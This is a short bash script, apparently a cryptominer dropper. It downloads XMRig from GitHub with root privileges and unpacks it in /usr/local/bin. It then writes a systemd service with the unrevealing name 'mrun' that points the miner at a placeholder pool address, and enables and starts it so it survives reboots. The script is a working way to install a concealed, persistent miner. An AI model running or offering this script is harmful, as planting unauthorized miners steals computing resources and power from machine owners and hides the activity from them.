#!/bin/bash
proxy="proxy_"

cd / 
cd /usr/local/bin 
sudo wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz 
sudo tar -xf xmrig-6.17.0-linux-static-x64.tar.gz 
sudo bash -c "echo -e \"[Unit]\nAfter=network.target\n[Service]\nType=simple\nExecStart=/usr/local/bin/xmrig-6.17.0/xmrig -o $proxy:80\n[Install]\nWantedBy=multi-user.target\" > /etc/systemd/system/mrun.service" 
sudo systemctl daemon-reload 
sudo systemctl enable mrun.service 
sudo systemctl start mrun.service
